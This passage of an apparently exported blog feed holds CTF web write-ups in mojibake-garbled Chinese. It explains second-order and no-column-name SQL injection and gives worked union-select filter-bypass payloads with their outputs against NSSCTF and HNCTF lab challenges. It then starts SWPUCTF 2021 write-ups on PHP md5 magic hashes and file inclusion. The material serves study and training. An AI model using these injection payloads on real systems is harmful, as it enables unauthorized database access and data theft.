class="line">ä¸¤è€…å±å®³ä¸€è‡´ã€‚ä½†æ˜¯äºŒé˜¶æ³¨å…¥å¾ˆéš¾é€šè¿‡æ‰«æå·¥å…·ç›´æ¥æ‰«æå‡ºæ¥ï¼›å¯ä»¥è¿›è¡Œé»‘ç›’æµ‹è¯•ï¼Œä½†æ˜¯æƒ³è¦å‘ç°æ¼æ´æœ‰ä¸€å®šçš„éš¾åº¦ï¼›æœ€å¥½çš„å‘ç°æ¼æ´çš„æ–¹æ³•æ˜¯é€šè¿‡ç™½ç›’å®¡è®¡</span><br></pre></td></tr></table></figure></div>

<p>mysql_escape_stringå‡½æ•°ï¼Œè¯¥å‡½æ•°å¯ä»¥è¿‡æ»¤ç”¨æˆ·è¾“å…¥çš„å‚æ•°ï¼Œå¦‚æœè¾“å…¥ä¸­å­˜åœ¨å•å¼•å·ä¹‹ç±»çš„ç‰¹æ®Šå­—ç¬¦ï¼Œåˆ™ä¼šåœ¨å•å¼•å·å‰é¢æ·»åŠ åæ–œæ è¿›è¡Œè½¬ä¹‰ï¼Œä½†æ˜¯ç»è¿‡æ”¹å‡½æ•°å¤„ç†çš„å‚æ•°åœ¨å­˜å…¥æ•°æ®åº“æ—¶ï¼Œä¼šè¢«è¿˜åŸæˆåŸæ•°æ®(è¯¥å‡½æ•°å±äº PHP æ—§ç‰ˆ mysql æ‰©å±•ï¼ˆéé¢å‘å¯¹è±¡æ¥å£ï¼‰ï¼ŒPHP 5.5.0 åå·²åºŸå¼ƒï¼Œä¸å»ºè®®åœ¨æ–°é¡¹ç›®ä¸­ä½¿ç”¨ã€‚)<br>addsasheså‡½æ•°ï¼Œä½œç”¨åŒä¸Š</p>
<p>ä¸¾ä¾‹è¯´æ˜ï¼š<br>å‡è®¾ä¸€ä¸ªç½‘ç«™æ•°æ®åº“ä¸­å­˜åœ¨ä¸€ä¸ªç”¨æˆ·åä¸ºï¼šâ€œadminâ€ï¼Œå¯†ç ä¸ºï¼šâ€œ123456â€ã€‚æ”»å‡»è€…æ³¨å†Œç”¨æˆ·åä¸ºï¼šâ€œadminâ€™â€“ â€ï¼Œå¯†ç ä¸ºï¼šâ€œ123â€ï¼›</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ABNF"><figure class="iseeu highlight /abnf"><table><tr><td class="code"><pre><span class="line">String name<span class="operator">=</span>StringEscapeUtiles.escapeSql(request.getParameter(<span class="string">&quot;Name&quot;</span>))<span class="comment">;</span></span><br><span class="line"></span><br><span class="line">String pwd<span class="operator">=</span>StringEscapeUtiles.escapeSql(request.getParameter(<span class="string">&quot;pwd&quot;</span>))<span class="comment">;</span></span><br><span class="line"></span><br><span class="line">String sql1<span class="operator">=</span><span class="string">&quot;insert into user(username,password) values (&quot;</span>name<span class="string">&quot;,&quot;</span>pwd<span class="string">&quot;)&quot;</span><span class="comment">;</span></span><br></pre></td></tr></table></figure></div>
<p>ç¨‹åºåœ¨æŠŠè¾“å…¥æ•°æ®å­˜å…¥æ•°æ®åº“ä¹‹å‰ï¼Œå¯¹è¾“å…¥çš„æ•°æ®ä¸­çš„å•å¼•å·è¿›è¡Œäº†è½¬ä¹‰æ¥é˜²æ­¢æ¶æ„è¾“å…¥å¯¹å¯¹æ•°æ®åº“ä¸­æ•°æ®å¸¦æ¥çš„å½±å“ï¼Œé¿å…äº†ä¸€é˜¶æ³¨å…¥å¸¦æ¥çš„é—®é¢˜ï¼Œä½†æ˜¯åœ¨æ•°æ®åº“ä¸­å­˜å…¥çš„ç”¨æˆ·åä»»ç„¶ä¸ºï¼šâ€œadminâ€™â€“ â€ç°åœ¨æ”»å‡»è€…è¦æ›´æ–°å¯†ç ï¼Œç¨‹åºä¼šé¦–å…ˆåˆ¤æ–­ç”¨æˆ·æ˜¯å¦å­˜åœ¨ï¼Œä»£ç ä¸ºï¼š</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ABNF"><figure class="iseeu highlight /abnf"><table><tr><td class="code"><pre><span class="line">String name<span class="operator">=</span>StringEscapeUtiles.escapeSql(request.getParameter(<span class="string">&quot;Name&quot;</span>))<span class="comment">;ã€€</span></span><br><span class="line"></span><br><span class="line">String oldpwd<span class="operator">=</span>StringEscapeUtiles.escapeSql(request.getParameter(<span class="string">&quot;oldpwd&quot;</span>))<span class="comment">;</span></span><br><span class="line"></span><br><span class="line">String newpwd<span class="operator">=</span>StringEscapeUtiles.escapeSql(request.getParameter(<span class="string">&quot;newpwd&quot;</span>))<span class="comment">;ã€€ã€€</span></span><br><span class="line"></span><br><span class="line">String sql2 <span class="operator">=</span> <span class="string">&quot;select * from user where username=&quot;</span>name<span class="string">&quot; and password=&quot;</span>oldpwd<span class="string">&quot;&quot;</span><span class="comment">;</span></span><br></pre></td></tr></table></figure></div>
<p>ç¡®è®¤ç”¨æˆ·å­˜åœ¨ä¸”å¯†ç æ­£ç¡®æ—¶ï¼Œåº”ç”¨ç¨‹åºæ‰§è¡Œæ›´æ–°å¯†ç è¯­å¥ï¼š<br>sql3&#x3D;â€update user set password&#x3D;â€newpwdâ€ where username&#x3D;â€usernameâ€â€;<br>åœ¨æ•°æ®åº“æ‰§è¡Œäº†<br>update user set password &#x3D;â€œ111111â€ where username&#x3D;â€™adminâ€™â€“ â€˜<br>æ‰€ä»¥æœ€ç»ˆä¿®æ”¹äº†adminç”¨æˆ·çš„å¯†ç è€Œä¸æ˜¯ç”¨æˆ·è‡ªå·±åˆ›å»ºç”¨æˆ·çš„å¯†ç </p>
<p>æ‰€ä»¥äºŒæ¬¡æ³¨å…¥ä¸å®¹æ˜“è¢«å‘ç°ï¼Œä¸€èˆ¬åœ¨ç™½ç›’æµ‹è¯•ä¸­æ‰ä¼šå‡ºç°<br>ä¸€èˆ¬å‡ºç°çš„åœºæ™¯åœ¨ç”¨æˆ·æ³¨å†Œï¼Œä¿®æ”¹å¯†ç ç­‰</p>
<h2 id="ä¾‹é¢˜-nssctf-October-2019-Twice-SQL-Injection"><a href="#ä¾‹é¢˜-nssctf-October-2019-Twice-SQL-Injection" class="headerlink" title="ä¾‹é¢˜ nssctf [October 2019]Twice SQL Injection"></a>ä¾‹é¢˜ nssctf [October 2019]Twice SQL Injection</h2><p><img src="https://pic1.imgdb.cn/item/68031d6358cb8da5c8b42c91.png"><br>è¿™é‡Œæœ‰ä¸€ä¸ªç™»å½•ç•Œé¢å’Œä¸€ä¸ªæ³¨å†Œçš„é€‰é¡¹<br>è¿™é‡Œå¯ä»¥å…ˆç”¨ä¸€ä¸ªäºŒæ¬¡æ³¨å…¥çš„å¸¸è§„æ‰‹æ®µï¼Œæ³¨å†Œä¸€ä¸ªç”¨æˆ·å«åš<code>admin&quot;#</code> å¯†ç æ˜¯123 ç„¶åç™»å½•<br>ç™»å½•ä¹‹åå¯ä»¥æŸ¥è¯¢ä¿¡æ¯ï¼Œè¿™é‡Œè¾“å…¥1â€™ or 1&#x3D;1# å‘ç°å¼•å·è¢«åæ–œæ è½¬ä¹‰<br><img src="https://pic1.imgdb.cn/item/68031f4b58cb8da5c8b43546.png"><br>ç„¶åè¿™é¢˜çš„åˆ©ç”¨æ–¹å¼æ˜¯æˆ‘ä»¬æ³¨å†Œç”¨æˆ·ï¼Œç„¶åé—­åˆæ’å…¥è¯­å¥ï¼Œè¿™æ ·åœ¨ç™»å½•çš„æ—¶å€™ï¼Œä¼šæ‰§è¡ŒæŸ¥è¯¢è¯­å¥ï¼Œå› ä¸ºç”¨æˆ·åé‡Œé—­åˆäº†ï¼Œå°±ä¼šæ‰§è¡Œæˆ‘ä»¬çš„è¯­å¥    å°è¯•åå‘ç°è¿™é‡Œæ˜¯å•å¼•å·é—­åˆ<br>aâ€™ union select database()#   ç™»å½•åå¾—åˆ°æ•°æ®åº“ctftraining<br>åé¢ä¹Ÿæœ‰ä¸€æ ·çš„æ–¹å¼ä¸€æ­¥æ­¥å¾—åˆ°flag</p>
<p>aâ€™ union select group_concat(table_name) from information_schema.tables where table_schema&#x3D;â€™ctftrainingâ€™#   &#x3D;&gt;flag,news,users</p>
<p>aâ€™ union select group_concat(column_name) from information_schema.columns where table_name&#x3D;â€™FLAG_TABLEâ€™#  &#x3D;&gt;flag</p>
<p>aâ€™ union select flag from flag#<br>å¾—åˆ°flag</p>
<h1 id="æ— åˆ—åæ³¨å…¥"><a href="#æ— åˆ—åæ³¨å…¥" class="headerlink" title="æ— åˆ—åæ³¨å…¥"></a>æ— åˆ—åæ³¨å…¥</h1><p>æ— åˆ—åæ³¨å…¥å°±æ˜¯information_schemaè¿™ä¸ªåº“è¢«bançš„æ—¶å€™ï¼Œä¸èƒ½é€šè¿‡é€šè¿‡è¿™ä¸ªåº“æŸ¥è¯¢åˆ—åå’Œè¡¨å<br>å¯¹äºè¡¨åæ¥è¯´ï¼Œå¯ä»¥ä½¿ç”¨<code>mysql.innodb_index_stats</code> <code>mysql.innodb_table_stats</code> <code>sys.schema_auto_increment_columns</code> è¿™äº›åº“åªèƒ½æŸ¥è¯¢åˆ°åˆ°è¡¨åï¼Œä½†æ˜¯æŸ¥è¯¢ä¸åˆ°åˆ—å ã€‚ æ— åˆ—åæ³¨å…¥å°±æ˜¯ä¸éœ€è¦åˆ—åå°±å¯ä»¥æŸ¥è¯¢åˆ°æ•°æ®<br>åŸç†ï¼š åœ¨æŸ¥è¯¢çš„æ—¶å€™æŠŠåˆ—åå–åˆ«å<br>æ¯”å¦‚ç°åœ¨æœ‰ä¸€ä¸ªè¡¨ï¼Œæœ‰ä¸‰ä¸ªå­—æ®µï¼Œç”¨æ— åˆ—åæŸ¥è¯¢çš„æ–¹å¼æŸ¥è¯¢ä¸€ä¸‹æ•°æ®<br><img src="https://pic1.imgdb.cn/item/685f7d1558cb8da5c879d8d2.png"><br>è¿™æ ·å­ä¼šåˆ›å»ºä¸€ä¸ªè™šæ‹Ÿçš„è¡¨ï¼Œè¡¨åå˜æˆ1ï¼Œ2ï¼Œ3  ä½†æ˜¯æŸ¥è¯¢æ—¶è¯­å¥çš„å­—æ®µæ•°å¿…é¡»å’ŒæŒ‡å®šè¡¨ä¸­çš„å­—æ®µæ•°ä¸€æ ·<br>æ‰€ä»¥é€šè¿‡æ— åˆ—åæŸ¥è¯¢æ„é€ ä¸€ä¸ªè™šæ‹Ÿè¡¨ï¼Œåœ¨æ„é€ æ­¤è¡¨çš„åŒæ—¶æŸ¥è¯¢å…¶ä¸­çš„æ•°æ®ã€‚<br><img src="https://pic1.imgdb.cn/item/685f7d8f58cb8da5c879d8ea.png"><br>åƒè¿™æ ·å°±å¯ä»¥æŸ¥è¯¢ç¬¬äºŒåˆ—çš„æ•°æ®ï¼Œåœ¨è™šæ‹Ÿè¡¨ä¸­ï¼Œåˆ—åéƒ½æ˜¯1ï¼Œ2ï¼Œ3ï¼Œæ‰€ä»¥æˆ‘ä»¬åœ¨æŸ¥è¯¢è¯­å¥ä¸­è¦ç”¨ 2è€Œä¸èƒ½ç›´æ¥ç”¨ 2 ã€‚è¦ä½¿ç”¨â€`â€œä¸è¿‡æœ‰æ—¶å€™ä¹Ÿä¼šè¢«è¿‡æ»¤ï¼Œè¿™æ—¶å€™æˆ‘ä»¬å°±åˆè¦ç”¨å¦å–åˆ«åäº†ã€‚</p>
<figure class="highlight n1ql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="number">1</span> <span class="keyword">as</span> a,<span class="number">2</span> <span class="keyword">as</span> b,<span class="number">3</span> <span class="keyword">as</span> c <span class="keyword">union</span> <span class="keyword">select</span> * <span class="keyword">from</span> users;</span><br></pre></td></tr></table></figure>
<p>æŠŠ1,2,3å¦å–åˆ«åä¸ºa,b,c,è¿™æ ·å¯ä»¥ä¸ä½¿ç”¨åå•å¼•å·ï¼Œå¯ä»¥çœ‹åˆ°ï¼Œæ­¤æ—¶æ„é€ çš„è™šæ‹Ÿè¡¨çš„åˆ—åå°±åˆ†åˆ«æ˜¯a,b,cäº†ã€‚æ­¤æ—¶æŸ¥è¯¢å°±å¯ä»¥ç›´æ¥é€šè¿‡a,b,cæ¥æŸ¥ã€‚</p>
<figure class="highlight n1ql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> b <span class="keyword">from</span> (<span class="keyword">select</span> <span class="number">1</span> <span class="keyword">as</span> a,<span class="number">2</span> <span class="keyword">as</span> b,<span class="number">3</span> <span class="keyword">as</span> c <span class="keyword">union</span> <span class="keyword">select</span> * <span class="keyword">from</span> users)n;</span><br></pre></td></tr></table></figure>

<h2 id="ä¾‹é¢˜-HNCTF-2022-WEEK2-easy-sql"><a href="#ä¾‹é¢˜-HNCTF-2022-WEEK2-easy-sql" class="headerlink" title="ä¾‹é¢˜ [HNCTF 2022 WEEK2]easy_sql"></a>ä¾‹é¢˜ [HNCTF 2022 WEEK2]easy_sql</h2><p>å…ˆfuzzä¸€ä¸‹ï¼Œçœ‹çœ‹è¿‡æ»¤äº†ä»€ä¹ˆ<br><img src="https://pic1.imgdb.cn/item/685f81f758cb8da5c879fe3f.png"><br>å‘ç°ç©ºæ ¼  informationè¿™äº›éƒ½è¿‡æ»¤äº†ï¼Œæ‰€ä»¥ç¡®å®šè¿™é¢˜æ˜¯æ— åˆ—åæ³¨å…¥<br>å…ˆæŸ¥æ•°æ®åº“</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="MAXIMA"><figure class="iseeu highlight /maxima"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span>&#x27;<span class="comment">/**/</span><span class="built_in">union</span><span class="comment">/**/</span>select<span class="comment">/**/</span><span class="number">1</span>,<span class="number">2</span>,database()<span class="comment">/**/</span>&#x27;</span><br><span class="line"></span><br><span class="line">Here <span class="built_in">is</span> your want!</span><br><span class="line">I am so handsomeHere <span class="built_in">is</span> your want!</span><br><span class="line">ctf</span><br></pre></td></tr></table></figure></div>
<p>ç„¶åæŸ¥è¯¢æ•°æ®åº“å</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="VHDL"><figure class="iseeu highlight /vhdl"><table><tr><td class="code"><pre><span class="line"><span class="number">0</span><span class="symbol">&#x27;union</span><span class="comment">/**/</span><span class="keyword">select</span><span class="comment">/**/</span><span class="number">1</span>,<span class="number">2</span>,group_concat(database_name)<span class="comment">/**/</span>from<span class="comment">/**/</span>mysql.innodb_table_stats<span class="comment">/**/</span>union<span class="comment">/**/</span><span class="keyword">select</span><span class="comment">/**/</span><span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span><span class="comment">/**/</span>&#x27;<span class="number">1</span></span><br><span class="line"></span><br><span class="line">Here <span class="keyword">is</span> your want!</span><br><span class="line">ctf,ctftraining,ctftraining,ctftraining,mysqlHere <span class="keyword">is</span> your want!</span><br><span class="line"><span class="number">3</span></span><br></pre></td></tr></table></figure></div>
<p>æŸ¥è¯¢æ•°æ®åº“ä¸­çš„è¡¨å</p>
<figure class="highlight n1ql"><table><tr><td class="code"><pre><span class="line">0&#x27;union<span class="comment">/**/</span><span class="keyword">select</span><span class="comment">/**/</span><span class="number">1</span>,<span class="number">2</span>,group_concat(table_name)<span class="comment">/**/</span><span class="keyword">from</span><span class="comment">/**/</span>mysql.innodb_table_stats<span class="comment">/**/</span><span class="keyword">where</span><span class="comment">/**/</span>database_name=<span class="string">&#x27;ctftraining&#x27;</span><span class="comment">/**/</span><span class="keyword">union</span><span class="comment">/**/</span><span class="keyword">select</span><span class="comment">/**/</span><span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span><span class="comment">/**/</span><span class="string">&#x27;1</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Here is your want!</span></span><br><span class="line"><span class="string">flag,news,usersHere is your want!</span></span><br><span class="line"><span class="string">3</span></span><br></pre></td></tr></table></figure>
<p>å‘ç°flagåœ¨è¿™ä¸ªè¡¨ä¸­ï¼Œæ¥ä¸‹æ¥å°±æ˜¯ç”¨æ— è¡¨åæ³¨å…¥å¾—åˆ°flagçš„å€¼<br>flagå¤§æ¦‚ç‡å°±åªæœ‰ä¸€åˆ—</p>
<figure class="highlight n1ql"><table><tr><td class="code"><pre><span class="line">0&#x27;union<span class="comment">/**/</span><span class="keyword">select</span><span class="comment">/**/</span><span class="number">1</span>,<span class="number">2</span>,group_concat(x)<span class="comment">/**/</span><span class="keyword">from</span><span class="comment">/**/</span>(<span class="keyword">select</span><span class="comment">/**/</span><span class="number">1</span><span class="comment">/**/</span><span class="keyword">as</span><span class="comment">/**/</span>x<span class="comment">/**/</span><span class="keyword">union</span><span class="comment">/**/</span><span class="keyword">select</span><span class="comment">/**/</span>*<span class="comment">/**/</span><span class="keyword">from</span><span class="comment">/**/</span>ctftraining.flag)a<span class="comment">/**/</span><span class="keyword">union</span><span class="comment">/**/</span><span class="keyword">select</span><span class="comment">/**/</span><span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span><span class="comment">/**/</span><span class="string">&#x27;1</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Here is your want!</span></span><br><span class="line"><span class="string">1,NSSCTF&#123;757a5d03-0610-4a70-b13b-2ebb9950f5e8&#125;Here is your want!</span></span><br><span class="line"><span class="string">3</span></span><br></pre></td></tr></table></figure>

<p>æœ€åè¦åŠ ä¸Šunion select 1,2,3 æ˜¯ä¸ºäº†å’Œåé¢çš„å•å¼•å·é—­åˆ<br>å·²çŸ¥Â Â order byÂ ã€fromÂ Â åé¢ä¸å¯è·Ÿâ€™1â€™ï¼Œè¿™å±äºè¯­æ³•é”™è¯¯ï¼Œä½†æ˜¯union selectåé¢å¯ä»¥è·Ÿé—­åˆè¯­å¥ï¼Œå› æ­¤éœ€è¦åœ¨æœ€ååŠ ä¸€ä¸ªunion selectè¯­å¥</p>
<p>å‚è€ƒé“¾æ¥<br><a href="https://blog.csdn.net/m0_73734159/article/details/133928538">https://blog.csdn.net/m0_73734159/article/details/133928538</a><br><a href="https://blog.csdn.net/xuanyulevel6/article/details/126521051">https://blog.csdn.net/xuanyulevel6/article/details/126521051</a><br><a href="https://blog.csdn.net/qq_43625917/article/details/101235231?ops_request_misc=%7B%22request_id%22:%22166138787816782246492486%22,%22scm%22:%2220140713.130102334.pc_all.%22%7D&request_id=166138787816782246492486&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~first_rank_ecpm_v1~pc_rank_34-5-101235231-null-null.142%5Ev42%5Epc_rank_34_1,185%5Ev2%5Econtrol&utm_term=exp%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5&spm=1018.2226.3001.4187">https://blog.csdn.net/qq_43625917/article/details/101235231?ops_request_misc=%7B%22request%5Fid%22%3A%22166138787816782246492486%22%2C%22scm%22%3A%2220140713.130102334.pc%5Fall.%22%7D&amp;request_id=166138787816782246492486&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~first_rank_ecpm_v1~pc_rank_34-5-101235231-null-null.142%5Ev42%5Epc_rank_34_1,185%5Ev2%5Econtrol&amp;utm_term=exp%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5&amp;spm=1018.2226.3001.4187</a><br><a href="https://blog.csdn.net/qq_35569814/article/details/100188947">https://blog.csdn.net/qq_35569814/article/details/100188947</a><br><a href="https://blog.csdn.net/qq_53856457/article/details/121268143">https://blog.csdn.net/qq_53856457/article/details/121268143</a><br><a href="https://mp.weixin.qq.com/s/yOCRQ1wEI5nh-RcJhnYW4A">https://mp.weixin.qq.com/s/yOCRQ1wEI5nh-RcJhnYW4A</a></p>
]]></content>
      <categories>
        <category>CTF</category>
        <category>web</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>web</tag>
      </tags>
  </entry>
  <entry>
    <title>SWPUCTF_2021æ–°ç”Ÿèµ›(web)WP</title>
    <url>/posts/25446.html</url>
    <content><![CDATA[<p>SWPUCTF_2021æ–°ç”Ÿèµ›webæ–¹å‘wp</p>
<span id="more"></span>
<p>åšé¢˜å¹³å°:<a href="https://www.nssctf.cn/problem">nssctf</a></p>
<h1 id="gift-F12"><a href="#gift-F12" class="headerlink" title="gift_F12"></a>gift_F12</h1><p>æ‰“å¼€é¢˜ç›®åï¼ŒæŸ¥çœ‹æºä»£ç å°±æœ‰flag</p>
<h1 id="jicao"><a href="#jicao" class="headerlink" title="jicao"></a>jicao</h1><p>é¢˜ç›®ï¼š</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="string">&#x27;index.php&#x27;</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="variable">$id</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line"><span class="variable">$json</span>=<span class="title function_ invoke__">json_decode</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;json&#x27;</span>],<span class="literal">true</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$id</span>==<span class="string">&quot;wllmNB&quot;</span>&amp;&amp;<span class="variable">$json</span>[<span class="string">&#x27;x&#x27;</span>]==<span class="string">&quot;wllm&quot;</span>)</span><br><span class="line">&#123;<span class="keyword">echo</span> <span class="variable">$flag</span>;&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>
<p>æ ¹æ®ä»£ç ä¸­çš„é€»è¾‘ï¼Œå¦‚æœPOSTè¯·æ±‚çš„<code>id</code>å‚æ•°æ˜¯<code>wllmNB</code>ï¼Œå¹¶ä¸”ä»¥GETè¯·æ±‚çš„jsonå‚æ•°çš„xçš„å€¼æ˜¯<code>wllm</code>çš„æ—¶å€™è¾“å‡ºflagï¼Œæ‰€ä»¥ç”¨hackbarä¿®æ”¹<br><img src="https://pic1.imgdb.cn/item/67ae0589d0e0a243d4fef380.png"></p>
<h1 id="easy-md5"><a href="#easy-md5" class="headerlink" title="easy_md5"></a>easy_md5</h1><p>é¢˜ç›®ï¼š</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"> <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"> <span class="keyword">include</span> <span class="string">&#x27;flag2.php&#x27;</span>;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;name&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$name</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line">    <span class="variable">$password</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$name</span> != <span class="variable">$password</span> &amp;&amp; <span class="title function_ invoke__">md5</span>(<span class="variable">$name</span>) == <span class="title function_ invoke__">md5</span>(<span class="variable">$password</span>))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;wrong!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;wrong!&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">wrong!</span><br></pre></td></tr></table></figure></div>
<p>è¿™é‡Œç”¨GETè¯·æ±‚æ¥å—<code>name</code>,POSTè¯·æ±‚æ¥å—<code>password</code>ï¼Œå¦‚æœè¿™ä¸¤ä¸ªçš„å€¼ä¸ä¸€æ ·ï¼Œä½†æ˜¯md5ä¸€æ ·ï¼Œå°±è¾“å‡ºflagã€‚<br>åœ¨phpä¸­ï¼Œæ•°æ®å¦‚æœä»¥<code>0e</code>å¼€å¤´ä¼šè¢«è§†ä¸ºæ˜¯ç§‘å­¦è®¡æ•°æ³•ï¼Œè€Œä¸”æ˜¯0 * 10 <sup>n</sup> &#x3D; 0, æ‰€ä»¥<mark>åªè¦æ˜¯md5å€¼ä»¥0eå¼€å¤´å°±ä¼šè¢«å½“ä½œmd5ç›¸ç­‰</mark>ï¼Œè¿™é‡Œç»™å‡ºå‡ ä¸ªå¸¸è§çš„md5å¼€å¤´æ˜¯0eçš„å­—ç¬¦ä¸²ã€‚æœ‰çš„é¢˜ç›®è¿˜ä¼šå¤šä¸€å±‚é™åˆ¶ï¼Œæ¯”å¦‚ä¸€ä¸ªæ˜¯çº¯æ•°å­—ç­‰ã€‚</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="STYLUS"><figure class="iseeu highlight /stylus"><table><tr><td class="code"><pre><span class="line">   <span class="built_in">md5</span>(<span class="string">&#x27;240610708&#x27;</span>) = <span class="number">0</span>e462097431906509019562988736854</span><br><span class="line">   <span class="built_in">md5</span>(<span class="string">&#x27;QNKCDZO&#x27;</span>) = <span class="number">0</span>e830400451993494058024219903391</span><br><span class="line"><span class="function"><span class="title">md5</span><span class="params">(<span class="string">&#x27;aabg7XSs&#x27;</span>)</span></span> = <span class="number">0</span>e087386482136013740957780965295</span><br><span class="line"><span class="function"><span class="title">md5</span><span class="params">(<span class="string">&#x27;aabC9RqS&#x27;</span>)</span></span> = <span class="number">0</span>e260421314791580664869894734725  </span><br></pre></td></tr></table></figure></div>
<p>ç”¨hackbarä¸Šä¼ ï¼Œå¾—åˆ°flag<br><img src="https://pic1.imgdb.cn/item/67ae07b9d0e0a243d4fef3cf.png"></p>
<h1 id="include"><a href="#include" class="headerlink" title="include"></a>include</h1><p>é¢˜ç›®ï¼š </p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="APPLESCRIPT"><figure class="iseeu highlight /applescript"><table><tr><td class="code"><pre><span class="line">ä¼ å…¥ä¸€ä¸ª<span class="built_in">file</span>è¯•è¯•</span><br></pre></td></tr></table></figure></div>
<p>å…ˆåœ¨urlä¸­è¾“å…¥<code>?file=1</code> , å¾—åˆ°æºä»£ç </p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&quot;allow_url_include&quot;</span>,<span class="string">&quot;on&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;Content-type: text/html; charset=utf-8&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="variable">$file</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$file</span>))&#123;</span><br><span class="line">    <span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;flag åœ¨flag.phpä¸­&#x27;</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;ä¼ å…¥ä¸€ä¸ªfileè¯•è¯•&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">include_once</span>(<span class="variable">$file</span>);</span><br><span class="line"><span class="meta">?&gt;</span> flag åœ¨flag.phpä¸­</span><br></pre></td></tr></table></figure></div>
